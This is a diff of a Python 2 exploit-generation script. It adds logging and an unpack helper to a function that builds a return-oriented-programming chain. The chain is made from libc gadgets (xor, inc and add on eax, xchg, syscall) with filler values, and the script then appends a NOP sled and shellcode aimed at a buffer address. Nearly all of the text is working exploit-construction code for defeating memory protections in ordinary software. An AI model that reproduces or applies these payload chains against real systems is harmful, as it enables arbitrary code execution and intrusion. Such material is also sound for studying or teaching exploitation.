@@ -307,6 +307,10 @@ def pack_value(value):
     packed_value = struct.pack("<I", value)
     return packed_value
 
+def unpack_value(byte_string):
+    unpacked_value = struct.unpack("<I", byte_string)[0]
+    return unpacked_value
+
 def find_gadget_addr(lib_list, func):
     
     offset = 0
@@ -736,8 +740,18 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
     mov_ecx_eax_addr = pack_value(temp)
     rop_payload += mov_ecx_eax_addr
     rop_payload += 4 * pack_value(0x11111111)
+    print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
+    print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
+    print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
+    print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
     #print 'Address of mov ecx, eax; ret = 0x%x' %(temp)
     rop_payload += xor_eax_addr
+
+    if unpack_value(xor_eax_addr) == 0:
+        print '\tUnable to find gadget for xor  eax,eax; ret;'
+        result = False
+    else:
+        print '\t[0x%x]\txor  eax, eax; ret\t\t%s' %(unpack_value(xor_eax_addr), lib_name)
 
     temp, lib_name = find_gadget_addr(lib_list, find_mov_edx_eax)
     if temp == 0:
@@ -748,6 +762,9 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
     mov_edx_eax_addr = pack_value(temp)
     rop_payload += mov_edx_eax_addr
     rop_payload += 3 * pack_value(0x11111111)
+    print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
+    print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
+    print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
     #print 'Address of mov edx, eax; ret = 0x%x' %(temp)
 
     temp, lib_name = find_gadget_addr(lib_list, find_push_esp_pop_ebx)
@@ -759,7 +776,7 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
     push_esp_addr = pack_value(temp)
     rop_payload += push_esp_addr
     rop_payload += pack_value(0x11111111)
-    #print 'Address of push esp, pop ebx; ret = 0x%x' %(temp)
+    print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
 
     temp, lib_name = find_gadget_addr(lib_list, find_xchg_eax_ebx)
     if temp == 0:
@@ -781,19 +798,35 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
     rop_payload += and_eax_xff_addr
     rop_payload += pack_value(0x11111111)
     #print 'Address of and eax, 0xfffff000; ret = 0x%x' %(temp)
+    print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
     
     rop_payload += xchg_eax_ebx_addr
 
+    if unpack_value(xchg_eax_ebx_addr) == 0:
+        print '\tUnable to find gadget for xchg eax, ebx; ret;'
+        result = False
+    else:
+        print '\t[0x%x]\txchg  eax, ebx; ret\t\t%s' %(unpack_value(xchg_eax_ebx_addr), lib_name)
 
     rop_payload += xor_eax_addr
 
-
-    temp, lib_name = find_gadget_addr(lib_list, find_inc_eax)
-    if temp == 0:
-        print '\tUnable to find gadget for inc eax; ret;'
+    if unpack_value(xor_eax_addr) == 0:
+        print '\tUnable to find gadget for xor  eax,eax; ret;'
         result = False
     else:
-        print '\t[0x%x]\tinc  eax; ret\t\t%s' %(temp, lib_name)
+        print '\t[0x%x]\txor  eax, eax; ret\t\t%s' %(unpack_value(xor_eax_addr), lib_name)
+
+    temp, lib_name = find_gadget_addr(lib_list, find_inc_eax)
+
+    j = 0
+    while j < 7:
+        if temp == 0:
+            print '\tUnable to find gadget for inc eax; ret;'
+            result = False
+        else:
+            print '\t[0x%x]\tinc  eax; ret\t\t%s' %(temp, lib_name)
+        j += 1
+
     inc_eax_addr = pack_value(temp)
     rop_payload += 7 * inc_eax_addr
     #print 'Address of inc eax; ret = 0x%x' %(temp)
@@ -812,18 +845,30 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
 
 
     temp, lib_name = find_gadget_addr(lib_list, find_add_eax_x20)
-    if temp == 0:
-        print '\tUnable to find gadget for add eax, 0x20; ret;'
-        result = False
-    else:
-        print '\t[0x%x]\tadd  eax, 0x20; ret\t\t%s' %(temp, lib_name)
-
+    j = 0
+    while j < 4:
+        if temp == 0:
+            print '\tUnable to find gadget for add eax, 0x20; ret;'
+            result = False
+        else:
+            print '\t[0x%x]\tadd  eax, 0x20; ret\t\t%s' %(temp, lib_name)
+        print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
+        print '\t[0x%x]\tDummy value for pop instruction\t\t' %(0x11111111)
+        j += 1
 
     add_eax_x20_addr = pack_value(temp)
     rop_payload += 4 * (add_eax_x20_addr + 2 * pack_value(0x11111111))
     #print 'Address of add eax, 0x20; ret = 0x%x' %(temp)
 
     rop_payload += 3 * dec_eax_addr
+    j = 0
+    while j < 3:
+        if unpack_value(dec_eax_addr) == 0:
+            print '\tUnable to find gadget for dec  eax; ret;'
+            result = False
+        else:
+            print '\t[0x%x]\tdec  eax; ret\t\t%s' %(unpack_value(dec_eax_addr), lib_name)
+        j += 1
 
     temp, lib_name = find_gadget_addr(lib_list, find_syscall)
     if temp == 0:
@@ -834,7 +879,7 @@ def build_rop_chain_libc_syscalls(lib_list, buf_address):
 
     syscall_addr = pack_value(temp)
     #print 'Address of syscall; ret = 0x%x' %(temp)
-
+    print '\t[0x%x]\tShellcode address\t\t' %(buf_address)
 
     nop_len = buf_len + 8 - len(packed_shellcode) - (len(ret_addr) * 10)
     nop_sled = "\x90" * nop_len
